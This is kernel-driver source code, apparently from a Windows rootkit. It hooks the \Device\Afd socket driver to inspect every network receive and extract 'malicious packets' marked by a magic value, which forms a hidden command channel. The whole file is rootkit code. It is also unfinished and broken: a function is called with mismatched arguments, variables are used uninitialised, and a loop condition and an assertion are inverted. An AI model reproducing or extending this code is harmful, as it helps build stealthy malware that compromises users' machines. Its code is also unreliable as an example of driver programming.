/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "AfdHook.h"

/**
	Initialize the AfdHook class, specifically the hooks on all FILE_OBJECTs with the device \Device\Afd.
*/
AfdHook::AfdHook (
	VOID
	)
{
	//
	// Create the FileObjHook instance.
	//
	this->AfdDeviceHook = new (NonPagedPool, AFD_FILE_HOOK_TAG) FileObjHook(AFD_DEVICE_BASE_NAME, DirectHook, AfdHook::HookAfdIoctl, NULL);
	if (this->AfdDeviceHook == NULL)
	{
		DBGPRINT("AfdHook!AfdHook: Failed to allocate memory for Afd FileObjHook.");
		return;
	}
}

/**
	Hook for IOCTL requests made against \Device\Afd.
	@param OriginalFunction - The original IOCTL function for the Afd driver.
	@param DeviceObject - The real device object associated with the Afd driver.
	@param Irp - The IRP for the current request.
*/
NTSTATUS
AfdHook::HookAfdIoctl (
	_In_ DRIVER_DISPATCH OriginalFunction,
	_In_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
	)
{
	NTSTATUS returnStatus;
	PAFD_RECV_INFO recvInformation;
	PIO_STACK_LOCATION irpStackLocation;

	BOOLEAN deviceControlRequest;
	PVOID inputBuffer;
	ULONG inputBufferLength;
	DWORD ioControlCode;
	PFILE_OBJECT fileObject;

	ULONG totalRecvLength;
	PVOID recvBuffer;
	ULONG currentBufferOffset;
	ULONG currentCopyLength;

	ULONG magicOffset;

	BASE_PACKET basePacket;
	ULONG64 currentBasePacketPosition;
	ULONG remainingBaseLength;
	ULONG i;
	ULONG bytesReceived;

	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	deviceControlRequest = FALSE;
	inputBuffer = NULL;
	ioControlCode = 0;
	fileObject = NULL;

	//
	// Before calling the original function we need to save the passed parameters.
	//
	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
	{
		inputBuffer = irpStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;
		inputBufferLength = irpStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ioControlCode = irpStackLocation->Parameters.DeviceIoControl.IoControlCode;
		fileObject = irpStackLocation->FileObject;
		deviceControlRequest = TRUE;
	}

	//
	// Grab the actual return value.
	//
	returnStatus = OriginalFunction(DeviceObject, Irp);

	//
	// Only process IRP_MJ_DEVICE_CONTROL requests.
	//
	if (deviceControlRequest)
	{
		if (ioControlCode == IOCTL_AFD_RECV)
		{
			recvInformation = RCAST<PAFD_RECV_INFO>(inputBuffer);
			totalRecvLength = Irp->IoStatus.Information;

			//
			// TODO: Remove this later, not necessary.
			//
			DBGPRINT("AfdHook!HookAfdIoctl: recv ProcessId(%i), BufferCount(%i), AfdFlags(%i), status(0x%X)", PsGetCurrentProcessId(), recvInformation->BufferCount, recvInformation->AfdFlags, returnStatus);

			//
			// Dealing with user-mode memory, need to absolutely wrap in a try/catch.
			//
			__try
			{
				ProbeForRead(recvInformation, sizeof(AFD_RECV_INFO), sizeof(ULONG));

				//
				// If the recv wasn't successful, not worth to check.
				//
				if (NT_SUCCESS(returnStatus) == FALSE)
				{
					goto Exit;
				}

				//
				// Sanity check to make sure we have at least one buffer.
				//
				if (recvInformation->BufferCount == 0)
				{
					goto Exit;
				}

				//
				// Make sure the first buffer can fit a magic value.
				//
				if (totalRecvLength < sizeof(DWORD))
				{
					goto Exit;
				}

				//
				// First, allocate the space required to store the entire packet.
				//
				recvBuffer = ExAllocatePoolWithTag(PagedPool, totalRecvLength, MALICIOUS_PACKET_TAG);
				if (recvBuffer == NULL)
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Failed to allocate space for recvBuffer.");
					goto Exit;
				}
				memset(recvBuffer, 0, totalRecvLength);

				//
				// For each buffer, add it to the recvBuffer.
				//
				currentBufferOffset = 0;
				for (i = 0; i < recvInformation->BufferCount; i++)
				{
					//
					// If the current buffer has a length greater than the remaining bytes,
					// copy only the remaining bytes.
					//
					currentCopyLength = totalRecvLength - currentBufferOffset;
					if (recvInformation->BufferArray[i].len <= currentCopyLength)
					{
						//
						// Otherwise, copy the entirety of the buffer.
						//
						currentCopyLength = recvInformation->BufferArray[i].len;
					}

					//
					// Copy the buffer.
					//
					memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(recvBuffer) + currentBufferOffset), totalRecvLength - currentBufferOffset, recvInformation->BufferArray[i].buf, currentCopyLength);
					
					//
					// Increment the current offset by the amount of data we copied.
					//
					currentBufferOffset += currentCopyLength;

					//
					// If we've reached the total bytes received, break.
					//
					if (currentBufferOffset >= totalRecvLength)
					{
						break;
					}
				}

				//
				// The current number of bytes copied should never be less then the total bytes received.
				//
				NT_ASSERT(currentBufferOffset < totalRecvLength);

				//
				// Scan the buffer for a magic value.
				// The reason we do not increment by 4 is because we don't know what data
				// prepends the magic. It may well be misaligned.
				//
				magicOffset = -1;
				for (i = 0; i < totalRecvLength; i++)
				{
					if (*RCAST<DWORD*>(RCAST<ULONG64>(recvBuffer) + i) == PACKET_MAGIC)
					{
						magicOffset = i;
						break;
					}
				}

				//
				// If we didn't find a magic, exit.
				//
				if (magicOffset == -1)
				{
					goto Exit;
				}

				DBGPRINT("AfdHook!HookAfdIoctl: Found magic in recv call.");

				//
				// Finally, process the packet.
				//
				AfdHook::ProcessMaliciousPacket(&basePacket, fileObject, DeviceObject, recvInformation);
			}
			__except (1)
			{
				DBGPRINT("AfdHook!HookAfdIoctl: WARNING: Exception.");
			}
			

		}
	}

Exit:
	if (recvBuffer)
	{
		ExFreePoolWithTag(recvBuffer, MALICIOUS_PACKET_TAG);
	}
	return returnStatus;
}

/**
	Populate a base packet structure. If necessary, receive more bytes to populate entirely.
	@param BasePacket - The base packet to populate.
	@param SocketFileObject - Pointer to the FILE_OBJECT for the target socket.
	@param OriginalDeviceObject - The original device object for the Afd driver.
	@param RecvInformation - Information regarding the recv call.
	@param RecvBuffer - A single buffer containing all bytes received during the current recv call.
	@param RecvBufferSize - Size of the RecvBuffer.
	@param MagicOffset - The offset at which the PACKET_MAGIC is located.
	@param RemainingBytes - The number of bytes remaining after the base packet.
	@return Whether or not parsing was successful. Fails if cannot receive more bytes for some reason.
*/
BOOLEAN
AfdHook::PopulateBasePacket (
	_Inout_ PBASE_PACKET BasePacket,
	_In_ PFILE_OBJECT SocketFileObject,
	_In_ PDEVICE_OBJECT OriginalDeviceObject,
	_In_ PAFD_RECV_INFO RecvInformation,
	_In_ PVOID RecvBuffer,
	_In_ ULONG RecvBufferSize,
	_In_ ULONG MagicOffset,
	_Inout_ ULONG* RemainingBytes
	)
{
	ULONG currentBasePacketOffset;
	ULONG bytesReceived;
	ULONG64 currentBasePacketPosition;

	currentBasePacketOffset = RecvBufferSize - MagicOffset;
	*RemainingBytes = 0;

	//
	// Copy over what we can.
	//
	memcpy_s(BasePacket, sizeof(BASE_PACKET), RCAST<PVOID>(RCAST<ULONG64>(RecvBuffer) + MagicOffset), (currentBasePacketOffset > sizeof(BASE_PACKET)) ? sizeof(BASE_PACKET) : currentBasePacketOffset);

	//
	// Check if we have enough bytes for a base packet.
	//
	if (currentBasePacketOffset < sizeof(BASE_PACKET))
	{
		DBGPRINT("AfdHook!PopulateBasePacket: Packet does not contain enough data for a base packet. Receiving the rest.");

		do
		{
			//
			// Receive the rest of the base packet.
			//
			if(AfdHook::ReceiveBuffer(SocketFileObject,
									  OriginalDeviceObject,
									  RCAST<CHAR*>(RCAST<ULONG64>(BasePacket) + currentBasePacketOffset),
									  sizeof(BASE_PACKET) - currentBasePacketOffset,
									  RecvInformation->AfdFlags,
									  RecvInformation->TdiFlags,
									  &bytesReceived) == FALSE)
			{
				DBGPRINT("AfdHook!PopulateBasePacket: Failed to receive rest of base packet.");
				return FALSE;
			}
			currentBasePacketOffset += bytesReceived;
		} while (currentBasePacketOffset >= sizeof(BASE_PACKET));

		DBGPRINT("AfdHook!PopulateBasePacket: Received the rest of the base packet.");
	}
	//
	// If we have more space than a base packet, set the remaining bytes.
	//
	else
	{
		*RemainingBytes = currentBasePacketOffset - sizeof(BASE_PACKET);
	}

	return TRUE;
}


VOID
AfdHook::ProcessMaliciousPacket (
	_In_ PVOID RecvBuffer,
	_In_ ULONG RecvBufferSize,
	_In_ ULONG MagicOffset,
	_In_ PFILE_OBJECT SocketFileObject,
	_In_ PDEVICE_OBJECT OriginalDeviceObject,
	_In_ PAFD_RECV_INFO RecvInformation
	)
{
	BASE_PACKET partialBasePacket;
	PBASE_PACKET fullBasePacket;
	ULONG remainingBytes;

	//
	// Populate the base packet structure.
	//
	if (AfdHook::PopulateBasePacket(&partialBasePacket, SocketFileObject, OriginalDeviceObject, RecvInformation, RecvBuffer, RecvBufferSize, MagicOffset, &remainingBytes) == FALSE)
	{
		DBGPRINT("AfdHook!ProcessMaliciousPacket: Failed to populate the base packet.");
		goto Exit;
	}

	DBGPRINT("AfdHook!ProcessMaliciousPacket: Received base packet with length %i, type %i, and %i extra bytes.", partialBasePacket.PacketLength, partialBasePacket.Type, remainingBytes);

	//
	// Allocate enough memory for the entire packet.
	//
	fullBasePacket = RCAST<PBASE_PACKET>(ExAllocatePoolWithTag(NonPagedPool, partialBasePacket.PacketLength, MALICIOUS_PACKET_TAG));
	if (fullBasePacket == NULL)
	{
		DBGPRINT("AfdHook!ProcessMaliciousPacket: Failed to allocate enough memory for a base packet with the length %i.", partialBasePacket.PacketLength);
		goto Exit;
	}
	memset(fullBasePacket, 0, partialBasePacket.PacketLength);


Exit:
	if (fullBasePacket)
	{
		ExFreePoolWithTag(fullBasePacket, MALICIOUS_PACKET_TAG);
	}
}

BOOLEAN
AfdHook::PopulateMaliciousPacket (
	_Inout_ PBASE_PACKET FullBasePacket,
	_In_ PBASE_PACKET PartialBasePacket,
	_In_ PFILE_OBJECT SocketFileObject,
	_In_ PDEVICE_OBJECT OriginalDeviceObject,
	_In_ PAFD_RECV_INFO RecvInformation,
	_In_ PVOID RecvBuffer,
	_In_ ULONG RecvBufferSize,
	_In_ ULONG MagicOffset
	)
{
	ULONG remainingBytes;
	ULONG remainingMaliciousBytes;
	ULONG currentPacketOffset;
	ULONG bytesReceived;

	//
	// First, copy the original base packet.
	//
	memcpy_s(FullBasePacket, PartialBasePacket->PacketLength, PartialBasePacket, sizeof(BASE_PACKET));
	remainingMaliciousBytes = PartialBasePacket->PacketLength - sizeof(BASE_PACKET);

	//
	// If we have more malicious bytes than necessary, copy those.
	//
	if (remainingBytes)
	{
		memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(FullBasePacket) + sizeof(BASE_PACKET)),
			remainingMaliciousBytes,
			RCAST<PVOID>(RCAST<ULONG64>(RecvBuffer) + MagicOffset + sizeof(BASE_PACKET)),
			remainingBytes);

		//
		// Adjust the remaining packets appropriately.
		//
		if (remainingBytes >= remainingMaliciousBytes)
		{
			remainingMaliciousBytes = 0;
		}
		else
		{
			remainingMaliciousBytes -= remainingBytes;
		}
	}

	DBGPRINT("AfdHook!ProcessMaliciousPacket: There are %i more bytes to receive.", remainingMaliciousBytes);

	//
	// If necessary, receive the remaining bytes.
	//
	if (remainingMaliciousBytes)
	{
		do
		{
			currentPacketOffset = (PartialBasePacket->PacketLength - sizeof(BASE_PACKET)) - remainingMaliciousBytes;
			//
			// Receive the rest of the base packet.
			//
			if (AfdHook::ReceiveBuffer(SocketFileObject,
				OriginalDeviceObject,
				RCAST<CHAR*>(RCAST<ULONG64>(FullBasePacket) + currentPacketOffset),
				remainingMaliciousBytes,
				RecvInformation->AfdFlags,
				RecvInformation->TdiFlags,
				&bytesReceived) == FALSE)
			{
				DBGPRINT("AfdHook!ProcessMaliciousPacket: Failed to receive rest of full packet.");
				return FALSE;
			}
			remainingMaliciousBytes -= bytesReceived;
		} while (remainingMaliciousBytes > 0);
	}

	return TRUE;
}
